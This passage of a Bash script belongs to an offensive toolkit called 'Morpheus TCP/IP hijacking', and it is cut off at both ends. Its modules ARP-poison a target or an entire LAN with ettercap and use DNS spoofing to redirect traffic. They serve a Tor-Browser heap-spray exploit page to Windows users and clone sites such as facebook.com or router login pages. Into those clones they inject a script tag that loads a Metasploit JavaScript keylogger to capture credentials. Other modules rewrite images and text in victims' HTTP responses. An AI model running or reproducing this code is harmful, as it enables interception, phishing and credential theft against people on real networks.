  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}`
  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}`
  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | grep -o "Android"` # user-agent == Android
  echo "${GreenF}    $HoSt"
  sleep 1
  echo "${GreenF}    $AcLa"
  sleep 1
  echo "${GreenF}    $DisP"
  sleep 1

cd $IPATH
# if in captured packet its writen: Android then its vulnerable
if [ "$VeVul" = "$nOn" ]; then
echo "${GreenF}    Browser report: vulnerable...${BlueF}"
sleep 3
else
echo "${GreenF}    Browser report:${RedF} not vulnerable...${BlueF}"
sleep 3
echo "${RedF}[x] warning: running against a non-compatible target!"
sleep 1
fi

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
  mv /tmp/etter.dns $Edns
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft # backup
  rm $IPATH/output/UserAgent.ef
  rm $ApachE/index.html
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# -----------------------------------------------------
# TOR-BROWSER BUFFER OVERFLOW EXPLOIT [windows systems]
# -----------------------------------------------------
sh_stage12 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} This module will crash target tor-browser (windows sys) using a  ${BlueF}|"
echo "${BlueF}    | ${YellowF} Heap Spray writen in javascript (deliver under mitm + dns_spoof) ${BlueF}|"
echo "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
echo "${BlueF}    | ${YellowF}  2 - If tor version its exploitable then deliver payload.        ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/UserAgent.log
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns # backup
  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb # backup
  # copy files to apache2 webroot
  cp $IPATH/bin/phishing/tor_0day/cssbanner.js $ApachE/cssbanner.js
  cp $IPATH/bin/phishing/tor_0day/Tor-Exploit.html $ApachE/index.html
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft
  sed -i "s|TaRgEt|$IP|g" etter.dns
  sed -i "s|PrE|$PrEfI|g" etter.dns
  cp $IPATH/bin/etter.dns $Edns
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
  sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
      else
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
      fi

  cd $IPATH/logs
  # display captured user-agent strings to user
  # User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
  nOn="Windows NT" # only windows systems are affected...
  tr -cd '\11\12\15\40-\176' < UserAgent.log > clean-file.log # remove non-ancii caracters
  mv clean-file.log UserAgent.log
  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}`
  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}`
  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | grep -o "Windows NT"`
  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}`
  echo "${GreenF}    $HoSt"
  sleep 1
  echo "${GreenF}    $AcLa"
  sleep 1
  echo "${GreenF}    $DisP"
  sleep 1

cd $IPATH
# check if target system its vulnerable (windows systems)
if [ "$VeVul" != "$nOn" ]; then
echo "${GreenF}    System report:${RedF} not vulnerable...${BlueF}"
sleep 3
echo "${RedF}[x] warning: running against a non-compatible target!"
sleep 1
else
echo "${GreenF}    System report: vulnerable...${BlueF}"
sleep 3
fi

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/tor_buffer -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/tor_buffer -M ARP /$rhost/ /$gateway/
        fi
      fi



  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
  mv /tmp/etter.dns $Edns
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft # backup
  rm $IPATH/output/UserAgent.ef
  rm $ApachE/index.html
  rm $ApachE/cssbanner.js
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# ---------------------------------------------------------------
# INJECT A JAVA KEYLOOGER INTO TARGET WEBPAGE
# clone a website and inject a metasploit iframe (java_keylogger)
# ---------------------------------------------------------------
sh_stage13 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} This module will allow you to clone a webpage at your choice and ${BlueF}|"
echo "${BlueF}    | ${YellowF} inject a java keylooger on it, then uses mitm + dns_spoof to be  ${BlueF}|"
echo "${BlueF}    | ${YellowF} abble to redirect target traffic to the cloned webpage were the  ${BlueF}|"
echo "${BlueF}    | ${YellowF} java keylooger (metasploit required) waits for input credentials.${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF} WARNING:'msfconsole required to capture credentials from target' ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then


echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.com\nchose domain name to be cloned." --entry --width 270)


  # dowloading/clonning website target
  cd $IPATH/output && mkdir clone && cd clone
  echo ${BlueF}[☠]${white} Please wait, clonning webpage${RedF}!${Reset};
  sleep 1 && mkdir $cLon && cd $cLon
  # download -nd (no-directory) -nv (low verbose) -Q (download quota) -A (file type) -m (mirror)
  wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js,.css,.gif $cLon | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Cloning webpage: $cLon" --percentage=0 --auto-close --width 300
  # inject the javascript <TAG> in cloned index.html using SED command
  echo ${BlueF}[☠]${white} Inject javascript Into cloned webpage${RedF}!${Reset};
  sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
  mv copy.html index.html
  # copy all files to apache2 webroot
  echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
  sleep 2
  cp index.html $ApachE/index.html # NO dev/null to report file not existence
  cd ..
  cp -r $cLon $ApachE/$cLon
  cd $IPATH


    # backup all files needed.
    echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
    cd $IPATH/bin
    cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
    cp $Edns /tmp/etter.dns # backup
    # use SED bash command
    sed -i "s|TaRgEt|$IP|g" etter.dns
    sed -i "s|PrE|$PrEfI|g" etter.dns
    cp $IPATH/bin/etter.dns $Edns
    echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
    cd $IPATH
    sleep 1


    # start metasploit services
    echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
    service postgresql start
    if [ "$RbUdB" = "YES" ]; then
    msfdb delete
    msfdb init
    fi

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MSFCONSOLE" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost// /$gateway//
      else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "MORPHEUS TCP/IP HIJACKING" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $LoGmSf/*.txt $IPATH/logs
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
  mv /tmp/etter.dns $Edns
  rm -r $ApachE/$cLon
  rm -r $IPATH/output/clone
  cd $IPATH

# start apache2 webserver...
echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
service postgresql stop
# check if exist any reports
dd=`ls $IPATH/logs`
if ! [ -z "$dd" ]; then
Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
fi

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------------
# MODEM/ROUTER PHISHING (java_keylogger)
# --------------------------------------
sh_stage14 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}  This module allow you to clone the modem/router login webpage   ${BlueF}|"
echo "${BlueF}    | ${YellowF} inject a java keylooger on it, then uses mitm + dns_spoof to be  ${BlueF}|"
echo "${BlueF}    | ${YellowF} abble to redirect target traffic to the cloned webpage were the  ${BlueF}|"
echo "${BlueF}    | ${YellowF} java keylooger (metasploit required) waits for input credentials.${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF} WARNING:'msfconsole required to capture credentials from target' ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then


echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)



  # retrieve info about modem to inject into clone
  echo ${BlueF}[☠]${white} Gather Info about modem webpage${RedF}! ${Reset};
  nmap -sV -PN -p 80 $GaTe -oN $IPATH/output/retrieve.log | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Gather modem ip addr, mac addr and hostname .." --percentage=0 --auto-close --width 320


  # InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | awk {'print $4,$5,$6'}`
  InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1 | awk {'print $1,$2,$3'}` # grab modem name
  MaCa=`cat $IPATH/output/retrieve.log | egrep -m 1 "MAC" | awk {'print $3'}` # grab mac address ..
  # check if nmap have retrieved any string from scan
  if [ -z "$InjE" ]; then
  echo ${RedF}[x] Module cant gather Info about modem webpage! ${Reset};
  echo "${RedF}[x]${white} Using:${GreenF} 'broadband router'${white} as server name${RedF}!"
  sleep 2
  InjE="broadband router"
  MaCa="8A:17:62:35:22:UA"
  fi


# chose what phishing webpage to use 
PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Modem Info:\n$InjE\nLogin at: http://$GaTe\n\nChose phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "Default" FALSE "Meo" FALSE "DLink" FALSE "TPLink" FALSE "ZTE" FALSE "Technicolor" --width 350 --height 370)


  # building cloned login modem webpage
  cd $IPATH/bin/phishing/router-modem
  cp index.html index.rb
  cp login.html login.rb
  # chose 2º phishing webpage to use
  if [ "$PHiS" = "Meo" ]; then
    cp new.html new.rb
  fi
  # chose 3 phishing webpage to use
  if [ "$PHiS" = "DLink" ]; then
    cp -r DLINK $ApachE/DLINK
  fi
  # chose 4 phishing webpage to use
  if [ "$PHiS" = "TPLink" ]; then
    cp -r TPLink $ApachE/TPLink
  fi
  # chose 5 phishing webpage to use
  if [ "$PHiS" = "ZTE" ]; then
    cp -r ZTE $ApachE/ZTE
  fi
  # chose 6 phishing webpage to use
  if [ "$PHiS" = "Technicolor" ]; then
    cp -r Technicolor $ApachE/Technicolor
  fi


  # grab modem ip addr
  if [ "$PHiS" = "Meo" ]; then
    MIP=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
  else
    MIP="www.google.im"
  fi
  # chose 2º phishing webpage to use
  if [ "$PHiS" = "Meo" ]; then
    sed -i "s/MoDemIP/$MIP/" new.html
    sed -i "s/MaCa/$MaCa/" new.html
    sed -i "s/MoDemIP/www.google.im/" login.html
  elif [ "$PHiS" = "Default" ]; then
    sed -i "s/MoDemIP/$MIP/" login.html
  elif [ "$PHiS" = "TPLink" ]; then
    :
  elif [ "$PHiS" = "ZTE" ]; then
    sed -i "s/MoDemIP/www.google.im/" login.html
  elif [ "$PHiS" = "Technicolor" ]; then
    sed -i "s/MoDemIP/www.google.im/" login.html
  else
    sed -i "s/MoDemIP/$MIP/" login.html
  fi
  echo ${BlueF}[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
  sleep 1

  # chose 2º phishing webpage to use
  if [ "$PHiS" = "Meo" ]; then
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" new.html > copy.html
  elif [ "$PHiS" = "DLink" ]; then
    cd DLINK
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
    cd ..
  elif [ "$PHiS" = "TPLink" ]; then
    cd TPLink
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
    cd ..
  elif [ "$PHiS" = "ZTE" ]; then
    cd ZTE
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
    cd ..
  elif [ "$PHiS" = "Technicolor" ]; then
    cd Technicolor
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
    cd ..
  else
    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
  fi
  mv copy.html index.html
  sed -i "s|GatWa|$GaTe|g" index.html
  sed -i "s|DiSpt|$InjE|g" index.html
  # copy all files to apache2 webroot
  echo ${BlueF}[☠]${white} Copy files to apache2 webroot${RedF}!${Reset};
  sleep 2
  cp index.html $ApachE/index.html # NO dev/null to report file not existence
  cp login.html $ApachE/login.html
  cd ..
  cp -r $IPATH/bin/phishing/router-modem $ApachE/router-modem
  cd $IPATH

    # backup all files needed.
    echo ${BlueF}[☠]${white} Backup all files needed${RedF}!${Reset};
    cd $IPATH/bin
    cp $IPATH/bin/etter.dns $IPATH/bin/etter.rb # backup (NO dev/null to report file not existence)
    cp $Edns /tmp/etter.dns # backup
    sleep 1
    # use SED bash command
    sed -i "s|TaRgEt|$IP|g" etter.dns
    sed -i "s|PrE|$PrEfI|g" etter.dns
    cp $IPATH/bin/etter.dns $Edns
    echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
    cd $IPATH
    sleep 1


    # start metasploit services
    echo ${BlueF}[☠]${white} Start metasploit services...${Reset};
    service postgresql start
    if [ "$RbUdB" = "YES" ]; then
    msfdb delete
    msfdb init
    fi

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MSFCONSOLE" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost// /$gateway//
      else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "MORPHEUS TCP/IP HIJACKING" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $LoGmSf/*.txt $IPATH/logs
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
  mv $IPATH/bin/phishing/router-modem/index.rb $IPATH/bin/phishing/router-modem/index.html
  mv $IPATH/bin/phishing/router-modem/login.rb $IPATH/bin/phishing/router-modem/login.html
  mv $IPATH/bin/phishing/router-modem/new.rb $IPATH/bin/phishing/router-modem/new.html
  mv /tmp/etter.dns $Edns
  rm $IPATH/output/retrieve.log
  rm $ApachE/index.html
  rm $ApachE/login.html
  rm -r $ApachE/router-modem
  rm -r $ApachE/DLINK
  rm -r $ApachE/TPLink
  rm -r $ApachE/ZTE
  rm -r $ApachE/Technicolor
  # rm -r $IPATH/output/clone
  cd $IPATH

# start apache2 webserver...
echo ${BlueF}[☠]${white} Stop apache2 webserver...${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270
service postgresql stop
# check if exist any reports
dd=`ls $IPATH/logs`
if ! [ -z "$dd" ]; then
Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
fi

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------
# INJECT IMAGE INTO TARGET WEBSITE
# --------------------------------
sh_stage15 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}     This filter will replace the html tag '<img src=>' and       ${BlueF}|"
echo "${BlueF}    | ${YellowF}  injects your image in any webpage requested by target (http)    ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  WARNING:Thats no garantie that this filter will work with the   ${BlueF}|"
echo "${BlueF}    | ${YellowF}recent security implementations added to modern webbrowsers(hsts) ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.rb
sleep 1

  echo ${BlueF}[☠]${white} Edit img_replace.eft${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRONE|$fil_one|g" img_replace.eft # NO dev/null to report file not existence :D
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/img_replace.eft"
  sleep 1

    # compiling img_replace.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling img_replace.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/img_replace.eft -o $IPATH/output/img_replace.ef && sleep 3"
    sleep 1
    #
    # port-forward
    #
    echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      # HINT: irongeek nao usou UID 0 e SSL active...


      echo ${BlueF}[☠]${white} access this url to test${RedF}:${GreenF} https://nhm.org/site/${Reset};
      echo ${BlueF}[☠]${white} Remenber that this kind of attack works better againts Internet Explorer${Reset};
      sleep 2
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M arp:remote /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M arp:remote /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M arp:remote /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M arp:remote /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft
  #
  # port-forward
  #
  echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/img_replace.ef
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}




# --------------------------------
# REPLACE TEXT INTO TCP RESPONSE
# --------------------------------
sh_stage16 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}   This filter will replace text in target tcp responses (http)   ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  WARNING:Thats no garantie that this filter will work with the   ${BlueF}|"
echo "${BlueF}    | ${YellowF}recent security implementations added to modern webbrowsers(hsts) ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
cp $IPATH/filters/text_replace.eft $IPATH/filters/text_replace.rb
sleep 1

